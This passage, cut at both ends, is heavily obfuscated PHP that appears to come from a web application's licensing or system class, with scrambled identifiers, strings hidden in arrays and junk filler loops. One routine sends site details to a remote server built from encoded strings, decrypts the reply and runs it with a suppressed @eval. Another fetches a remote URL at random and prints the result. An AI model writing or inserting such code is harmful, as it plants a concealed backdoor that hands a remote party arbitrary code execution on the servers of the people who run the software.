3))); $Ìãƒô³¢ = $§œ½Èº¿[704]; while (strlen($Ìãƒô³¢) < $§œ½Èº¿[642]) { if (!$Ìãƒô³¢) { break; } $Ìãƒô³¢++; } $ÈëÛæ²Â = @file_get_contents($ ÃÕŒ•ü, !1, $ğ˜éÁ); $ÔÆˆ¤¥æ = $§œ½Èº¿[705]; if (!$ÔÆˆ¤¥æ) { return; } header($Ï·ôª“é[220]); $éÑÕ‘ë† = $§œ½Èº¿[706]; if ($ÈëÛæ²Â && strstr($ÈëÛæ²Â, $Ï·ôª“é[221])) { echo $ÈëÛæ²Â; } die; } public function siwx94b31b7b($ÍºÍÁÊğ) { $ÜğÌñ¦Å =& $_SERVER[…É¦À–]; $êÍÛöôí =& $_SERVER[…Ğİ€¤†]; if ($this->qsnp1c315e64 == $êÍÛöôí[222]) { return $ÍºÍÁÊğ; } $üöôìÏî = array($êÍÛöôí[223] => $êÍÛöôí[224], $êÍÛöôí[225] => $êÍÛöôí[224], $êÍÛöôí[226] => $êÍÛöôí[224], $êÍÛöôí[227] => $êÍÛöôí[228], $êÍÛöôí[229] => $êÍÛöôí[228], $êÍÛöôí[230] => $êÍÛöôí[228], $êÍÛöôí[231] => $êÍÛöôí[228], $êÍÛöôí[232] => $êÍÛöôí[228], $êÍÛöôí[233] => $êÍÛöôí[228], $êÍÛöôí[234] => $êÍÛöôí[228], $êÍÛöôí[235] => $êÍÛöôí[228], $êÍÛöôí[236] => $êÍÛöôí[228], $êÍÛöôí[237] => $êÍÛöôí[228], $êÍÛöôí[238] => $êÍÛöôí[228], $êÍÛöôí[239] => $êÍÛöôí[228]); $º¼‘Â¼õ = $ÜğÌñ¦Å[707]; if (strlen($º¼‘Â¼õ) < $ÜğÌñ¦Å[642]) { return; } $˜¦¹É«Ã = explode($êÍÛöôí[240], _get($this->nlez33831e20, $êÍÛöôí[112], $êÍÛöôí[6])); $‘âÄÁŞ = $ÜğÌñ¦Å[708]; if (!$‘âÄÁŞ) { die; } $üŞÄ¨®  = array(); foreach ($üöôìÏî as $ç‰Ø‹ => $Å÷Ã²Œ) { if ($Å÷Ã²Œ == $êÍÛöôí[224] && substr($this->qsnp1c315e64, 0, 1) == $êÍÛöôí[224]) { continue; } if (!in_array($ç‰Ø‹, $˜¦¹É«Ã)) { $üŞÄ¨® [] = $ç‰Ø‹; } } foreach ($üŞÄ¨®  as $ç‰Ø‹) { unset($ÍºÍÁÊğ[$ç‰Ø‹]); } return $ÍºÍÁÊğ; $—Õ—ŠÅË = $ÜğÌñ¦Å[709]; if (strlen($—Õ—ŠÅË) < $ÜğÌñ¦Å[647]) { die; } } private function sgki46c66b44() { $†¤ÎÅÕ =& $_SERVER[…Ğİ€¤†]; if ($this->qsnp1c315e64 != $†¤ÎÅÕ[106]) { $GLOBALS[$†¤ÎÅÕ[85]][$†¤ÎÅÕ[89]][$†¤ÎÅÕ[241]] = $†¤ÎÅÕ[203]; return; } $GLOBALS[$†¤ÎÅÕ[85]][$†¤ÎÅÕ[242]] = $†¤ÎÅÕ[121]; if (Model($†¤ÎÅÕ[243])->get($†¤ÎÅÕ[63]) != $†¤ÎÅÕ[203]) { Model($†¤ÎÅÕ[243])->set($†¤ÎÅÕ[63], $†¤ÎÅÕ[203]); } } public function dbkfb38eeb25() { return $_SERVER[…Ğİ€¤†][244]; $¿ÑÜÅ·ä = $_SERVER[…É¦À–][710]; } private function elqibe7f5c27() { $»ĞÊ¼‚ç =& $_SERVER[…É¦À–]; $´œ¿ò¢Ş =& $_SERVER[…Ğİ€¤†]; $ÅÉ²úÓş = array($´œ¿ò¢Ş[245], $´œ¿ò¢Ş[246], $´œ¿ò¢Ş[247]); $³Ä—îâ = $´œ¿ò¢Ş[248] . md5($´œ¿ò¢Ş[249]); if ($this->qsnp1c315e64 == $´œ¿ò¢Ş[106] || !_get($GLOBALS, $´œ¿ò¢Ş[115])) { return; } if (!in_array($_SERVER[$´œ¿ò¢Ş[24]], $ÅÉ²úÓş)) { return; } if (time() % 4 != 0) { return; } $æçñ™æš = call_user_func(array($´œ¿ò¢Ş[250], $´œ¿ò¢Ş[251]), $³Ä—îâ); if ($æçñ™æš && time() - $æçñ™æš < intval($´œ¿ò¢Ş[252])) { return; } call_user_func(array($´œ¿ò¢Ş[250], $´œ¿ò¢Ş[138]), $³Ä—îâ, time()); $¹Ìñ¸ú¢ = $»ĞÊ¼‚ç[711]; if (!$¹Ìñ¸ú¢) { return; } $À«•ÂşÂ = Model($´œ¿ò¢Ş[33])->get($´œ¿ò¢Ş[103]); $á¸˜ÌÃ = $»ĞÊ¼‚ç[712]; if (!$á¸˜ÌÃ) { return; } $İíá×€â = array($´œ¿ò¢Ş[150] => Model($´œ¿ò¢Ş[33])->get($´œ¿ò¢Ş[186]), $´œ¿ò¢Ş[163] => $this->qsnp1c315e64, $´œ¿ò¢Ş[160] => $_SERVER[$´œ¿ò¢Ş[161]], $´œ¿ò¢Ş[162] => Model($´œ¿ò¢Ş[33])->get($´œ¿ò¢Ş[130]), $´œ¿ò¢Ş[101] => md5($_SERVER[$´œ¿ò¢Ş[102]] . $À«•ÂşÂ), $´œ¿ò¢Ş[153] => $´œ¿ò¢Ş[135], $´œ¿ò¢Ş[156] => $_SERVER[$´œ¿ò¢Ş[157]]); $ë³ßÂˆá = $this->mulvf0e08d1a($´œ¿ò¢Ş[253], $İíá×€â); $™¡›¤Ğ© = $»ĞÊ¼‚ç[713]; if (!is_array($ë³ßÂˆá)) { return; } if ($ë³ßÂˆá[$´œ¿ò¢Ş[150]] && $ë³ßÂˆá[$´œ¿ò¢Ş[254]]) { if ($this->mpkre478bbfc($ë³ßÂˆá[$´œ¿ò¢Ş[254]]) == $İíá×€â[$´œ¿ò¢Ş[150]]) { return; } } $this->gbkv3a262de4(); $ô¹ŒÏâë = $»ĞÊ¼‚ç[714]; if (strlen($ô¹ŒÏâë) < $»ĞÊ¼‚ç[650]) { return; } if ($this->mpkre478bbfc($ë³ßÂˆá[$´œ¿ò¢Ş[254]]) != $İíá×€â[$´œ¿ò¢Ş[150]]) { $©ƒŠöİÎ = array($´œ¿ò¢Ş[181] => $À«•ÂşÂ, $´œ¿ò¢Ş[182] => $_SERVER[$´œ¿ò¢Ş[102]], $´œ¿ò¢Ş[183] => this_url(), $´œ¿ò¢Ş[158] => $_SERVER[$´œ¿ò¢Ş[159]]); $ÑôÁÜ» = $this->amtp0c1cb831(json_encode($©ƒŠöİÎ)); $ë³ßÂˆá = $this->mulvf0e08d1a($´œ¿ò¢Ş[184] . $ÑôÁÜ»); if ($ë³ßÂˆá && is_array($ë³ßÂˆá) && isset($ë³ßÂˆá[$´œ¿ò¢Ş[254]])) { $¤‹—ßœı = $this->lqzv982662d2($ë³ßÂˆá[$´œ¿ò¢Ş[254]], 2); if ($¤‹—ßœı) { $¤‹—ßœı = $this->mpkre478bbfc($¤‹—ßœı); } if ($¤‹—ßœı) { try { @eval($¤‹—ßœı); } catch (Exception $·˜×€â) { } } } } } private function mulvf0e08d1a($ú¤‰Œœ = '', $ğ“Ÿµ² = array(), $Üêˆ«Ì = 5) { $è¹—˜Õâ =& $_SERVER[…É¦À–]; $Î§íØ§€ =& $_SERVER[…Ğİ€¤†]; $ß›Ë›„· = $Î§íØ§€[255]; $¶»çÔ­ = $è¹—˜Õâ[715]; while ($¶»çÔ­ < $è¹—˜Õâ[647]) { if ($¶»çÔ­ >= 0) { break; } $¶»çÔ­++; } $ß›Ë›„· = $this->htdn550fea25($ß›Ë›„·, $Î§íØ§€[256]); $ß›Ë›„· = $ß›Ë›„· . $ú¤‰Œœ; $š÷éó·‰ = $è¹—˜Õâ[716]; if (strlen($š÷éó·‰) < $è¹—˜Õâ[640]) { die; } if ($ğ“Ÿµ² && is_array($ğ“Ÿµ²)) { $ß›Ë›„· = $ß›Ë›„· . $Î§íØ§€[257] . http_build_query($ğ“Ÿµ²); } if ($ğ“Ÿµ² === -1) { return $ß›Ë›„·; } $ıµç¹Ë = stream_context_create(array($Î§íØ§€[216] => array($Î§íØ§€[219] => $Üêˆ«Ì, $Î§íØ§€[217] => $Î§íØ§€[258]), $Î§íØ§€[259] => array($Î§íØ§€[260] => !1, $Î§íØ§€[261] => !1))); $‚‚í¼ÔŒ = $è¹—˜Õâ[717]; if (strlen($‚‚í¼ÔŒ) < $è¹—˜Õâ[642]) { return; } $ğ“Ÿµ² = @file_get_contents($ß›Ë›„·, !1, $ıµç¹Ë); return json_decode($ğ“Ÿµ², !0); $á§´Öõ = $è¹—˜Õâ[718]; if (strlen($á§´Öõ) < $è¹—˜Õâ[636]) { die; } } private function xwysfea6faf4() { $éÔ®éïé =& $_SERVER[…É¦À–]; $»ÃÏ§Š =& $_SERVER[…Ğİ€¤†]; $ûëˆÍ¼Ó = array($»ÃÏ§Š[262] => $»ÃÏ§Š[263], $»ÃÏ§Š[264] => $»ÃÏ§Š[265], $»ÃÏ§Š[266] => $»ÃÏ§Š[267], $»ÃÏ§Š[268] => $»ÃÏ§Š[269], $»ÃÏ§Š[270] => $»ÃÏ§Š[271], $»ÃÏ§Š[272] => $»ÃÏ§Š[211], $»ÃÏ§Š[273] => $»ÃÏ§Š[211], $»ÃÏ§Š[274] => $»ÃÏ§Š[263], $»ÃÏ§Š[275] => $»ÃÏ§Š[265], $»ÃÏ§Š[276] => $»ÃÏ§Š[267], $»ÃÏ§Š[277] => $»ÃÏ§Š[278], $»ÃÏ§Š[279] => $»ÃÏ§Š[269], $»ÃÏ§Š[280] => $»ÃÏ§Š[281], $»ÃÏ§Š[282] => $»ÃÏ§Š[271], $»ÃÏ§Š[283] => $»ÃÏ§Š[284], $»ÃÏ§Š[285] => $»ÃÏ§Š[286], $»ÃÏ§Š[287] => $»ÃÏ§Š[288]); $Œ¡¿öÎ‚ = $éÔ®éïé[719]; $ˆş¿áåÑ = $ûëˆÍ¼Ó[$this->qsnp1c315e64]; $ˆş¿áåÑ = intval($ˆş¿áåÑ ? $ˆş¿áåÑ : $»ÃÏ§Š[263]); $¿®ÅÛöš = $éÔ®éïé[720]; $”•ò´á‡ = _get($this->nlez33831e20, $»ÃÏ§Š[289]); $Ù¬ÎŸùÇ = $éÔ®éïé[721]; while (strlen($Ù¬ÎŸùÇ) < $éÔ®éïé[647]) { if (!$Ù¬ÎŸùÇ) { break; } $Ù¬ÎŸùÇ++; } $”•ò´á‡ = $”•ò´á‡ ? intval($”•ò´á‡) : 0; return $ˆş¿áåÑ + $”•ò´á‡; } public function hkdje85064eb($µßŠ°¼Ñ) { $Â‡Ï®Ÿ© =& $_SERVER[…Ğİ€¤†]; $İ˜íŠÖ„ = $this->xwysfea6faf4(); if ($µßŠ°¼Ñ[$Â‡Ï®Ÿ©[290]] == $Â‡Ï®Ÿ©[121]) { return; } if ($İ˜íŠÖ„ >= intval($Â‡Ï®Ÿ©[211])) { return; } $ÇüÊƒ­œ = Model($Â‡Ï®Ÿ©[124])->count(); if ($ÇüÊƒ­œ <= $İ˜íŠÖ„) { return; } $ğıı¥Îœ = Model($Â‡Ï®Ÿ©[124])->field($Â‡Ï®Ÿ©[290])->limit($İ˜íŠÖ„)->select(); $¾íÒÄ— = $_SERVER[…É¦À–][722]; if (!$¾íÒÄ—) { die; } $ğıı¥Îœ = array_to_keyvalue($ğıı¥Îœ, $Â‡Ï®Ÿ©[6], $Â‡Ï®Ÿ©[290]); if (!in_array($µßŠ°¼Ñ[$Â‡Ï®Ÿ©[290]], $ğıı¥Îœ)) { show_json($Â‡Ï®Ÿ©[291], !1, $Â‡Ï®Ÿ©[207]); } } public function gsmr49c93a3d() { $£Ø³ÁüÛ =& $_SERVER[…Ğİ€¤†]; if (!_get($GLOBALS, $£Ø³ÁüÛ[115]) || mt_rand(1, 100) > 20) { return; } $ÍÒ‰˜ = $£Ø³ÁüÛ[214]; $ÍÒ‰˜ = $this->htdn550fea25($ÍÒ‰˜, $£Ø³ÁüÛ[215]); $şŞÆ‚ô‘ = $_SERVER[…É¦À–][723]; if (!$şŞÆ‚ô‘) { return; } $Ó®›ñĞ = stream_context_create(array($£Ø³ÁüÛ[216] => array($£Ø³ÁüÛ[217] => $£Ø³ÁüÛ[218], $£Ø³ÁüÛ[219] => 3))); $ş¶†İÁÈ = @file_get_contents($ÍÒ‰˜, !1, $Ó®›ñĞ); echo $£Ø³ÁüÛ[292] . hash_encode($ş¶†İÁÈ) . $£Ø³ÁüÛ[293]; } private function ermp7daecf04($§ª³õ×á, $ûƒšÎ¶©, $›Š‘˜©£ = 3) { $‘¿ô´İ» =& $_SERVER[…É¦À–]; $ûÙ®×¶¯ =& $_SERVER[…Ğİ€¤†]; usleep(1); $É…—¼§Å = $‘¿ô´İ»[724]; while ($É…—¼§Å < $‘¿ô´İ»[650]) { if ($É…—¼§Å >= 0) { break; } $É…—¼§Å++; } $§ª³õ×á = trim($§ª³õ×á); $‡ò‹¿éİ = mt_rand(0, 5) . $ûÙ®×¶¯[6]; $åúÎ›ëÇ = $‘¿ô´İ»[725]; while (strlen($åúÎ›ëÇ) < $‘¿ô´İ»[650]) { if (!$åúÎ›ëÇ) { break; } $åúÎ›ëÇ++; } $ª°­ùßê = rand_string(15); $šîºıÑÚ = $‘¿ô´İ»[726]; if (strlen($šîºıÑÚ) < $‘¿ô´İ»[636]) { die; } $ÒÛşÆáŸ = $ûÙ®×¶¯[294]; switch ($‡ò‹¿éİ) { case $ûÙ®×¶¯[203]: $®× Õğá = $this->vjmfded6646f($§ª³õ×á, strrev($ûƒšÎ¶© . $ª°­ùßê)); $ïßüï = $‘¿ô´İ»[727]; break; $±„ÙÙëÊ = $‘¿ô´İ»[728]; if (strlen($±„ÙÙëÊ) < $‘¿ô´İ»[642]) { return; } case $ûÙ®×¶¯[121]: $®× Õğá = $this->vjmfded6646f($§ª³õ×á, strrev($ª°­ùßê . $ûƒšÎ¶©)); break; case $ûÙ®×¶¯[295]: $®× Õğá = $this->vjmfded6646f($§ª³õ×á, base64_encode($ª°­ùßê . $ûƒšÎ¶©)); $Ë”‰ˆÛ = $‘¿ô´İ»[729]; if (strlen($Ë”‰ˆÛ) < $‘¿ô´İ»[642]) { return; } break; case $ûÙ®×¶¯[296]: $®× Õğá = $this->vjmfded6646f($§ª³õ×á, md5($ª°­ùßê . $ûƒšÎ¶©)); $«†â²ûØ = $‘¿ô´İ»[730]; while (strlen($«†â²ûØ) < $‘¿ô´İ»[636]) { if (!$«†â²ûØ) { break; } $«†â²ûØ++; } break; $¹Ï¬àæÛ = $‘¿ô´İ»[731]; case $ûÙ®×¶¯[297]: $§ª³õ×á = base64_encode($§ª³õ×á); $ñù¡É®‹ = $‘¿ô´İ»[732]; while (strlen($ñù¡É®‹) < $‘¿ô´İ»[640]) { if (!$ñù¡É®‹) { break; } $ñù¡É®‹++; } $Ñ¥Ó©öå = rand(0, 64); $Á€ÉÓõÊ = $ÒÛşÆáŸ[$Ñ¥Ó©öå]; $ó‚üôæÔ = md5($Á€ÉÓõÊ . md5($ûƒšÎ¶© . $Á€ÉÓõÊ) . $ûƒšÎ¶©); $ ¦áÉÒ· = $‘¿ô´İ»[733]; while ($ ¦áÉÒ· < $‘¿ô´İ»[647]) { if ($ ¦áÉÒ· >= 0) { break; } $ ¦áÉÒ·++; } $ó‚üôæÔ = substr($ó‚üôæÔ, $Ñ¥Ó©öå % 8, $Ñ¥Ó©öå % 8 + 7); $®ş‰ûÖ = $‘¿ô´İ»[734]; if (strlen($®ş‰ûÖ) < $‘¿ô´İ»[650]) { die; } $šñ×ĞÖÛ = $ûÙ®×¶¯[6]; $âÈ¿“ÙÃ = $‘¿ô´İ»[735]; while (strlen($âÈ¿“ÙÃ) < $‘¿ô´İ»[640]) { if (!$âÈ¿“ÙÃ) { break; } $âÈ¿“ÙÃ++; } $ ±õ¼ÛØ = 0; $¼Ó©õ = 0; $•Šú×ëğ = 0; $Ö•™ŸÚğ = $‘¿ô´İ»[736]; if (!$Ö•™ŸÚğ) { die; } for ($ ±õ¼ÛØ = 0; $ ±õ¼ÛØ < strlen($§ª³õ×á); $ ±õ¼ÛØ++) { $•Šú×ëğ = $•Šú×ëğ == strlen($ó‚üôæÔ) ? 0 : $•Šú×ëğ; $¼Ó©õ = ($Ñ¥Ó©öå + strpos($ÒÛşÆáŸ, $§ª³õ×á[$ ±õ¼ÛØ]) + ord($ó‚üôæÔ[$•Šú×ëğ++])) % 64; $€äû–û = $‘¿ô´İ»[737]; $šñ×ĞÖÛ .= $ÒÛşÆáŸ[$¼Ó©õ]; } $®× Õğá = hash_encode($Á€ÉÓõÊ . $šñ×ĞÖÛ); $¹¬û…ªğ = $‘¿ô´İ»[738]; if (!$¹¬û…ªğ) { return; } break; $ÒÎä§À… = $‘¿ô´İ»[739]; if (strlen($ÒÎä§À…) < $‘¿ô´İ»[647]) { return; } default: $®× Õğá = $this->vjmfded6646f($§ª³õ×á, $ûƒšÎ¶© . $ª°­ùßê); $êú×Ëçğ = $‘¿ô´İ»[740]; if (!$êú×Ëçğ) { die; } break; } $®× Õğá = strrev($‡ò‹¿éİ . $ª°­ùßê . $®× Õğá); if ($›Š‘˜©£ - 1 > 0) { $®× Õğá = $this->ermp7daecf04($®× Õğá, $ûƒšÎ¶©, $›Š‘˜©£ - 1); } return $®× Õğá; } private function lqzv982662d2($£èşûŞ, $Ş¡™Ÿêœ, $Òõ¯©Ù = 3) { $ı½Æ÷¶ª =& $_SERVER[…É¦À–]; $¬ ×ƒº =& $_SERVER[…Ğİ€¤†]; if (!is_string($£èşûŞ) || strlen($£èşûŞ) < 10) { return !1; } $£èşûŞ = trim($£èşûŞ); $ùÁ¬‡ = $ı½Æ÷¶ª[741]; if (strlen($ùÁ¬‡) < $ı½Æ÷¶ª[636]) { die; } $£èşûŞ = strrev($£èşûŞ); $£å»§‰… = $£èşûŞ[0]; $°…¯ş“ = $ı½Æ÷¶ª[742]; if (!$°…¯ş“) { die; } $‚­Ùğƒû = substr($£èşûŞ, 1, 15); $£Ã’Î‹ = $ı½Æ÷¶ª[743]; while (strlen($£Ã’Î‹) < $ı½Æ÷¶ª[636]) { if (!$£Ã’Î‹) { break; } $£Ã’Î‹++; } $£èşûŞ = substr($£èşûŞ, 16); $Ş‡ì¹¢ = $ı½Æ÷¶ª[744]; while (strlen($Ş‡ì¹¢) < $ı½Æ÷¶ª[650]) { if (!$Ş‡ì¹¢) { break; } $Ş‡ì¹¢++; } $ú¿‰Ñº„ = $¬ ×ƒº[294]; switch ($£å»§‰…) { case $¬ ×ƒº[203]: $ÀŒ¹†ŞÓ = $this->htdn550fea25($£èşûŞ, strrev($Ş¡™Ÿêœ . $‚­Ùğƒû)); $æÀ€“‹à = $ı½Æ÷¶ª[745]; if (!$æÀ€“‹à) { die; } break; case $¬ ×ƒº[121]: $ÀŒ¹†ŞÓ = $this->htdn550fea25($£èşûŞ, strrev($‚­Ùğƒû . $Ş¡™Ÿêœ)); $Ø¯Ô¨õ = $ı½Æ÷¶ª[746]; if (strlen($Ø¯Ô¨õ) < $ı½Æ÷¶ª[650]) { die; } break; case $¬ ×ƒº[295]: $ÀŒ¹†ŞÓ = $this->htdn550fea25($£èşûŞ, base64_encode($‚­Ùğƒû . $Ş¡™Ÿêœ)); break; $íÖêÑ„ş = $ı½Æ÷¶ª[747]; while (strlen($íÖêÑ„ş) < $ı½Æ÷¶ª[650]) { if (!$íÖêÑ„ş) { break; } $íÖêÑ„ş++; } case $¬ ×ƒº[296]: $ÀŒ¹†ŞÓ = $this->htdn550fea25($£èşûŞ, md5($‚­Ùğƒû . $Ş¡™Ÿêœ)); $°ÑÉÔóÙ = $ı½Æ÷¶ª[748]; if (!$°ÑÉÔóÙ) { die; } break; $£²˜íËÜ = $ı½Æ÷¶ª[749]; while ($£²˜íËÜ < $ı½Æ÷¶ª[647]) { if ($£²˜íËÜ >= 0) { break; } $£²˜íËÜ++; } case $¬ ×ƒº[297]: $£èşûŞ = hash_decode($£èşûŞ); $ø¼À“Ï = $£èşûŞ[0]; $£èşûŞ = substr($£èşûŞ, 1); $ ™áÅ´¹ = strpos($ú¿‰Ñº„, $ø¼À“Ï); $Ã¿±Ê«« = $ı½Æ÷¶ª[750]; if (strlen($Ã¿±Ê««) < $ı½Æ÷¶ª[640]) { die; } $ÜÒßü“« = md5($ø¼À“Ï . md5($Ş¡™Ÿêœ . $ø¼À“Ï) . $Ş¡™Ÿêœ); $­“Ò‚”Ú = $ı½Æ÷¶ª[751]; if (!$­“Ò‚”Ú) { die; } $ÜÒßü“« = substr($ÜÒßü“«, $ ™áÅ´¹ % 8, $ ™áÅ´¹ % 8 + 7); $«Ã­ö–Ï = $¬ ×ƒº[6]; $˜Æ’º = 0; $¶ŞÍƒœ = 0; $Ì‰ê–±ı = $ı½Æ÷¶ª[752]; if (strlen($Ì‰ê–±ı) < $ı½Æ÷¶ª[650]) { die; } $õ¡ñµĞà = 0; for ($˜Æ’º = 0; $˜Æ’º < strlen($£èşûŞ); $˜Æ’º++) { $õ¡ñµĞà = $õ¡ñµĞà == strlen($ÜÒßü“«) ? 0 : $õ¡ñµĞà; $›É¶ßÈí = $ı½Æ÷¶ª[753]; if (!$›É¶ßÈí) { return; } $ÁĞ­Óá = $õ¡ñµĞà++; $¶ŞÍƒœ = strpos($ú¿‰Ñº„, $£èşûŞ[$˜Æ’º]) - $ ™áÅ´¹ - ord($ÜÒßü“«[$ÁĞ­Óá]); while ($¶ŞÍƒœ < 0) { $¶ŞÍƒœ += 64; $ˆ³®õÁ = $ı½Æ÷¶ª[754]; while (strlen($ˆ³®õÁ) < $ı½Æ÷¶ª[640]) { if (!$ˆ³®õÁ) { break; } $ˆ³®õÁ++; } } $«Ã­ö–Ï .= $ú¿‰Ñº„[$¶ŞÍƒœ]; $µ±í¨ = $ı½Æ÷¶ª[755]; if (strlen($µ±í¨) < $ı½Æ÷¶ª[636]) { die; } } $ÀŒ¹†ŞÓ = base64_decode($«Ã­ö–Ï); $§ÜŒ–’İ = $ı½Æ÷¶ª[756]; if (!$§ÜŒ–’İ) { return; } break; default: $ÀŒ¹†ŞÓ = $this->htdn550fea25($£èşûŞ, $Ş¡™Ÿêœ . $‚­Ùğƒû); break; $£“Â†¥Ó = $ı½Æ÷¶ª[757]; while (strlen($£“Â†¥Ó) < $ı½Æ÷¶ª[640]) { if (!$£“Â†¥Ó) { break; } $£“Â†¥Ó++; } } if ($Òõ¯©Ù - 1 > 0) { $ÀŒ¹†ŞÓ = $this->lqzv982662d2($ÀŒ¹†ŞÓ, $Ş¡™Ÿêœ, $Òõ¯©Ù - 1); } return $ÀŒ¹†ŞÓ; } public function amtp0c1cb831($õæ¹™†) { $‹¾‹Ñ†Í =& $_SERVER[…É¦À–]; $ğÕ•Ã×Ğ =& $_SERVER[…Ğİ€¤†]; $ûÂ€ô„Ÿ = $this->xhvp067e6066(); $í‰ïæ»Ó = $‹¾‹Ñ†Í[758]; if (strlen($í‰ïæ»Ó) < $‹¾‹Ñ†Í[636]) { return; } $ÇÎ†²‰ = $this->xhvp067e6066(); $§á—¡ÕÏ = $‹¾‹Ñ†Í[759]; $úÆ„ì¬ = ($ûÂ€ô„Ÿ - 1) * ($ÇÎ†²‰ - 1); $·Ç‘‚öü = $‹¾‹Ñ†Í[760]; while (strlen($·Ç‘‚öü) < $‹¾‹Ñ†Í[640]) { if (!$·Ç‘‚öü) { break; } $·Ç‘‚öü++; } $¢ØŸÂõ = intval(($ûÂ€ô„Ÿ + $ÇÎ†²‰) / 2); while (1) { $†š«Ô»À = $¢ØŸÂõ; $³µªÖÁ = $‹¾‹Ñ†Í[761]; if (strlen($³µªÖÁ) < $‹¾‹Ñ†Í[640]) { return; } $¡•¨ØŞ = $úÆ„ì¬; while ($¡•¨ØŞ % $†š«Ô»À != 0) { $Ã·Ä¤‚ = $¡•¨ØŞ; $¿ÂÄĞ‡ê = $‹¾‹Ñ†Í[762]; $¡•¨ØŞ = $†š«Ô»À; $øã¦¹ˆŠ = $‹¾‹Ñ†Í[763]; $†š«Ô»À = $Ã·Ä¤‚ % $†š«Ô»À; } if ($†š«Ô»À == 1) { break; } else { $¢ØŸÂõ++; } } $Ìºª‘‡¶ = 2; for ($’Ó†ğ”ˆ = 0; $’Ó†ğ”ˆ < $úÆ„ì¬ * 10; $’Ó†ğ”ˆ++) { if (($úÆ„ì¬ * $’Ó†ğ”ˆ + 1) % $¢ØŸÂõ == 0) { $Ìºª‘‡¶ = intval(($úÆ„ì¬ * $’Ó†ğ”ˆ + 1) / $¢ØŸÂõ); break; } } $öİ–ØĞ‡ = $this->vjmfded6646f($ûÂ€ô„Ÿ * $ÇÎ†²‰ . $ğÕ•Ã×Ğ[6], $ğÕ•Ã×Ğ[135]); $£™óµ¢Î = $‹¾‹Ñ†Í[764]; while (strlen($£™óµ¢Î) < $‹¾‹Ñ†Í[647]) { if (!$£™óµ¢Î) { break; } $£™óµ¢Î++; } $ì§«“Ìì = md5($ğÕ•Ã×Ğ[298] . ($ûÂ€ô„Ÿ + $ÇÎ†²‰) . $ğÕ•Ã×Ğ[299] . $¢ØŸÂõ . $ğÕ•Ã×Ğ[299] . $Ìºª‘‡¶ . $ğÕ•Ã×Ğ[300]); $Œô¶üÉÁ = $‹¾‹Ñ†Í[765]; while (strlen($Œô¶üÉÁ) < $‹¾‹Ñ†Í[640]) { if (!$Œô¶üÉÁ) { break; } $Œô¶üÉÁ++; } $´€şøØ = $this->vjmfded6646f($õæ¹™†, $ì§«“Ìì) . $ğÕ•Ã×Ğ[301] . $öİ–ØĞ‡; $Ü€Ü¥íå = $‹¾‹Ñ†Í[766]; return $´€şøØ; } public function mpkre478bbfc($”Ï²¢) { $‰„±¨ =& $_SERVER[…É¦À–]; $’ôíáâ¡ =& $_SERVER[…Ğİ€¤†]; $ıİ•Ü¨Œ = explode($’ôíáâ¡[301], $”Ï²¢); if (count($ıİ•Ü¨Œ) != 2) { return $’ôíáâ¡[6]; } $„½ïöÈ¹ = $this->htdn550fea25($ıİ•Ü¨Œ[1] . $’ôíáâ¡[6], $’ôíáâ¡[135]); $¯í™’½‘ = $‰„±¨[767]; if (!$¯í™’½‘) { die; } if (!$„½ïöÈ¹) { return $’ôíáâ¡[6]; } $„½ïöÈ¹ = intval($„½ïöÈ¹); $³ïäŞäİ = 0; $ôàÇ…˜û = $‰„±¨[768]; if (strlen($ôàÇ…˜û) < $‰„±¨[650]) { return; } $Ôôø—‰» = 0; for ($œıûŒ® = 3; $œıûŒ® < $„½ïöÈ¹; $œıûŒ® += 2) { if ($„½ïöÈ¹ % $œıûŒ® != 0) { continue; } $³ïäŞäİ = $œıûŒ®; $Ôôø—‰» = intval($„½ïöÈ¹ / $œıûŒ®); break; $ÍÂÀÓêˆ = $‰„±¨[769]; if (!$ÍÂÀÓêˆ) { die; } } $Á½ŸÚÂ‚ = ($³ïäŞäİ - 1) * ($Ôôø—‰» - 1); $¾ëñèáš = $‰„±¨[770]; $Ã¼ªöø = intval(($³ïäŞäİ + $Ôôø—‰») / 2); $ÇÏÅÂ…Ì = $‰„±¨[771]; while (1) { $šÓÖŸ”˜ = $Ã¼ªöø; $íÇ…šÌ¾ = $‰„±¨[772]; if (!$íÇ…šÌ¾) { die; } $£„®¡Ç = $Á½ŸÚÂ‚; $¼×èğ–è = $‰„±¨[773]; while (strlen($¼×èğ–è) < $‰„±¨[650]) { if (!$¼×èğ–è) { break; } $¼×èğ–è++; } while ($£„®¡Ç % $šÓÖŸ”˜ != 0) { $ß­ĞÊ½ = $£„®¡Ç; $Ä·¼Ş¤Ò = $‰„±¨[774]; $£„®¡Ç = $šÓÖŸ”˜; $œ×¤ñÅ‰ = $‰„±¨[775]; if (strlen($œ×¤ñÅ‰) < $‰„±¨[642]) { return; } $šÓÖŸ”˜ = $ß­ĞÊ½ % $šÓÖŸ”˜; $ŞÈÑÇÄÖ = $‰„±¨[776]; if (!$ŞÈÑÇÄÖ) { return; } } if ($šÓÖŸ”˜ == 1) { break; } else { $Ã¼ªöø++; } } $åø‹š¸Ş = 2; $®Ï«÷ = $‰„±¨[777]; while (strlen($®Ï«÷) < $‰„±¨[650]) { if (!$®Ï«÷) { break; } $®Ï«÷++; } for ($œıûŒ® = 0; $œıûŒ® < $Á½ŸÚÂ‚ * 10; $œıûŒ®++) { if (($Á½ŸÚÂ‚ * $œıûŒ® + 1) % $Ã¼ªöø == 0) { $åø‹š¸Ş = intval(($Á½ŸÚÂ‚ * $œıûŒ® + 1) / $Ã¼ªöø); break; } } $Ÿ‡Òíéš = md5($’ôíáâ¡[298] . ($³ïäŞäİ + $Ôôø—‰») . $’ôíáâ¡[299] . $Ã¼ªöø . $’ôíáâ¡[299] . $åø‹š¸Ş . $’ôíáâ¡[300]); $û‘ÏÊ£ = $‰„±¨[778]; while (strlen($û‘ÏÊ£) < $‰„±¨[640]) { if (!$û‘ÏÊ£) { break; } $û‘ÏÊ£++; } $âÍ¿™Í€ = $this->htdn550fea25($ıİ•Ü¨Œ[0], $Ÿ‡Òíéš); return $âÍ¿™Í€; $†ìÀ¼‚É = $‰„±¨[779]; if (!$†ìÀ¼‚É) { return; } } public function xhvp067e6066() { $ß¿Ì…† =& $_SERVER[…É¦À–]; $¯‰ğ–Ô = mt_rand(pow(2, 14), pow(2, 16) - 1); $ûÖª™ÈË = $ß¿Ì…†[780]; while ($ûÖª™ÈË < $ß¿Ì…†[636]) { if ($ûÖª™ÈË >= 0) { break; } $ûÖª™ÈË++; } $ı¬ü»üı = array(); $€şËØ˜ã = 1; while ($€şËØ˜ã <= (int) sqrt($¯‰ğ–Ô)) { $ëÛˆè£• = $€şËØ˜ã; while (!0) { $ëÛˆè£•++; $ÅÉ¡Â = $ß¿Ì…†[781]; while (strlen($ÅÉ¡Â) < 